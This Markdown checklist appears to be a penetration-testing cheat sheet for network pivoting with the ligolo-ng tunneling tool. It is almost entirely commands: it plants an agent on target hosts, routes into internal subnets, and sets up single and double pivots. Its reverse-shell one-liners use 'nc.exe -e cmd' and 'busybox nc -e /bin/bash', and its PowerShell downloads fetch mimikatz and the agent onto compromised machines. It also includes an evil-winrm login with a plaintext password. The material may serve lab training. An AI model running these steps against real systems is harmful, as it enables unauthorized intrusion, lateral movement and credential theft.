# Downloading binaries

- [ ] Download the proxy binary on your Kali Machine
```
https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
```
```
tar -zxvf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
```

- [ ] Download the agent binary on your Kali Machine
```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip
```
```
unzip ligolo-ng_agent_0.4.4_windows_amd64.zip
```

- [ ] Serve `agent.exe` on your Kali Machine
```
python3 -m http.server 80
```

- [ ] Download the agent binary on the Target Machine
```
powershell iwr -uri http://192.168.xxx.xxx/agent.exe -Outfile C:\Tools\agent.exe
```

# Setup Ligolo-ng 

- [ ] Create a `tun` interface on the Proxy Server (C2) on your Kali Machine
```
sudo ip tuntap add user kali mode tun ligolo
```

- [ ] Enable interface on your Kali Machine
```
sudo ip link set ligolo up
```

- [ ] Start proxy on your Kali Machine
```
chmod 777 proxy
./proxy -h
./proxy -selfcert
```
- By default it will be listening on all interfaces on port 11601

- [ ] Execute agent on the Target Machine to establish connection with the Ligolo server on your Kali Machine
```
.\agent.exe -connect 192.168.xxx.xxx:11601 -ignore-cert
```
- On your server it should show
	- `INFO[0155] Agent joined.`

- [ ] View sessions and select an appropriate session on your Kali Machine
```
session
```
- Use up/down arrows to move and enter to select

- [ ] In the session, on your Kali Machine, get adapter information about the agent that resides in the Target Machine
```
ifconfig
```

# Set up pivot

Add internal network to routing table on your Kali Machine
```
sudo ip route add 10.10.yyy.0/24 dev ligolo
```
- Adds internal network to routing table via the `ligolo` interface
- To delete use `del` instead of `add`

- [ ] Confirm that the route is added on your Kali Machine
```
ip route list
```

- [ ] Ensure you are in the right session on your Kali Machine
```
session
```
- Use up/down arrows to move and enter to select

- [ ] Start the tunnel on the proxy on your Kali Machine
```
start
```
- On your server it should show
	- `INFO[0768] Starting tunnel to HEENTAI\amongus@computer01`

# Access the internal network

- [ ] Test internal network connection E.g., Using `crackmapexec` on your Kali Machine
```
cme smb 10.10.yyy.0/24
```
- If crackmapexec can resolve the machines, we have access to internal network
- `proxychains` is not needed

# Create listener 

- [ ] View listeners on Ligolo server on your Kali Machine
```
listener_list
```

## Create listener for reverse shell

- [ ] Ensure you are in the right session on your Kali Machine
```
session
```
- Use up/down arrows to move and enter to select

- [ ] On your Kali Machine, create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server
```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```

- [ ] Ensure listener is added on your Ligolo server
```
listener_list
```

- [ ] Start nc listener on your Kali Machine
```
nc -nlvp 4321
```

- [ ] Get shell access on any Target Machine in the internal network (Not the machine with the agent)
```
evil-winrm -i 10.10.yyy.69 -u fanclubadmin@heentai -p "Iluv2Dgurlz" 
```

- [ ] On the Target Machine, create a reverse shell connection to the listener on the ligolo agent E.g., `nc.exe`
```
.\nc.exe 10.10.yyy.254 1234 -e cmd
```

## Create listener for file transfer

- [ ] Ensure you are in the right session on your Kali Machine
```
session
```
- Use up/down arrows to move and enter to select

- [ ] On your Kali Machine, create a TCP listening socket on the agent (0.0.0.0:8080) and redirect connections to the 80 port of the proxy server.
```
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp
```

- [ ] Ensure listener is added on your Ligolo server
```
listener_list
```

- [ ] Start python webserver on your Kali Machine
```
python3 -m http.server 80
```

- [ ] Download file(s) from webserver on the Target Machine
```
powershell iwr -uri http://10.10.yyy.254:8080/mimikatz.exe -Outfile C:\Tools\mimikatz.exe
```

# Double Pivot

- [ ] Ensure you are in the session of the Initial Pivot on your Kali Machine
```
session
```
- Use up/down arrows to move and enter to select

- [ ] On your Kali Machine, create a listener on the Initial Pivot session to send the new traffic to the Proxy server to establish a tunnel
```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

- [ ] Ensure listener is added on your Ligolo server
```
listener_list
```

- [ ] Download the ligolo agent onto the Double Pivot Target Machine through the Initial Pivot Machine
```
powershell iwr -uri http://10.10.yyy.254:8080/agent.exe -Outfile C:\Tools\agent.exe
```

- [ ] On the Double Pivot Target Machine, connect to the Proxy Server though the agent listener on the Initial Pivot Machine
```
./agent.exe -connect 10.10.yyy.254:11601 -ignore-cert
```
- On your server it should show
	- `INFO[2514] Agent joined.`

- [ ] Switch to the session of the Double Pivot on your Kali Machine
```
session
```
- Use up/down arrows to move and enter to select

- [ ] In the session, on your Kali Machine, get adapter information about the agent that resides in the Double Pivot Target Machine
```
ifconfig
```

- [ ] Add the new internal network to routing table on your Kali Machine
```
sudo ip route add 10.20.yyy.0/24 dev ligolo
```
- Adds internal network to routing table via the `ligolo` interface
- To delete use `del` instead of `add`

- [ ] Confirm that the route is added on your Kali Machine
```
ip route list
```

- [ ] Start the tunnel on the proxy on your Kali Machine
```
start
Yes
```
- On your server it should show
	- `Tunnel already running, switch from HEENTAI\amongus@computer01 to HEENTAI\fanservice@machine01? (y/N)`
	- `INFO[2781] Closing tunnel to HEENTAI\fanservice@machine01...`
	- `Starting tunnel to HEENTAI\fanservice@machine01`

# Create listener (Double pivot)

- [ ] View listeners on Ligolo server on your Kali Machine
```
listener_list
```

## Create listener for reverse shell (Double pivot)

- [ ] Ensure you are in the right session on your Kali Machine
```
session
```
- Use up/down arrows to move and enter to select

- [ ] On your Kali Machine, create a TCP listening socket on the agent (0.0.0.0:9696) and redirect connections to the 6969 port of the proxy server.
```
listener_add --addr 0.0.0.0:9696 --to 127.0.0.1:6969 --tcp
```

- [ ] Ensure listener is added on your Ligolo server
```
listener_list
```

- [ ] Start nc listener on your Kali Machine
```
nc -nlvp 6969
```

- [ ] Start a reverse shell connection to the listener on the ligolo agent at the Double Pivot Machine
```
busybox nc 10.20.yyy.254 9696 -e /bin/bash
```

## Create listener for file transfer (Double pivot)

- [ ] Ensure you are in the right session on your Kali Machine
```
session
```
- Use up/down arrows to move and enter to select

- [ ] On your Kali Machine, create a TCP listening socket on the agent (0.0.0.0:8888) and redirect connections to the 80 port of the proxy server.
```
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80 --tcp
```

- [ ] Ensure listener is added on your Ligolo server
```
listener_list
```

- [ ] Start python webserver on your Kali Machine
```
python3 -m http.server 80
```

- [ ] Download file(s) from webserver on the Target Machine through the Double Pivot Machine
```
wget http://10.20.yyy.254:8888/linpeas.sh
```


References:
https://github.com/nicocha30/ligolo-ng
https://www.youtube.com/watch?v=DM1B8S80EvQ
https://4pfsec.com/ligolo
